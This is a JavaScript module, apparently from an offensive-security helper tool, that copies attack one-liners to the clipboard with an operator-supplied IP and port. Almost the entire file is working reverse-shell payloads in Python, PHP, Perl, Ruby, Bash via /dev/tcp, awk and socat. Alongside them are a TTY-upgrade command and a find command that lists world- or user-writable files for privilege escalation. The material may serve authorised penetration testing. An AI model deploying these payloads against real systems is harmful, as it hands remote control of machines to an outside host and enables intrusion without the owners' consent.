import clipboard from 'clipboardy';

const wrapWithQuotes = val => `"${val.replace(/"/g, '\\"')}"`;

export default {/* eslint-disable max-len */
    'reverse shell (python)': [
        {
            text: 'Copy Python reverse shell to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'reverse shell (php)': [
        {
            text: 'Copy PHP reverse shell to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'reverse shell (perl)': [
        {
            text: 'Copy Perl reverse shell to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'reverse shell (ruby)': [
        {
            text: 'Copy Ruby reverse shell to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'reverse shell (bash)': [
        {
            text: 'Copy Bash reverse shell to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'reverse shell (awk)': [
        {
            text: 'Copy awk reverse shell to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    /**
     * Download standalone binary
     * @see https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
     */
    'reverse shell (socat)': [
        {
            text: 'Copy command to clipboard',
            task: async ({escaped, ip, port}) => {
                const cmd = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'spawn a TTY shell (python)': [
        {
            text: 'Copy command to clipboard',
            task: async ({escaped}) => {
                const cmd = `python -c 'import pty;pty.spawn("/bin/bash")'`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ],
    'find files/folders with write access (linux)': [
        {
            text: 'Copy command to clipboard',
            task: async ({escaped, user, group}) => {
                const cmd = `find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user ${user} -perm -u=w ')' -or '(' -group ${group} -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null`;
                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
            },
            condition: () => true
        }
    ]
};/* eslint-enable max-len */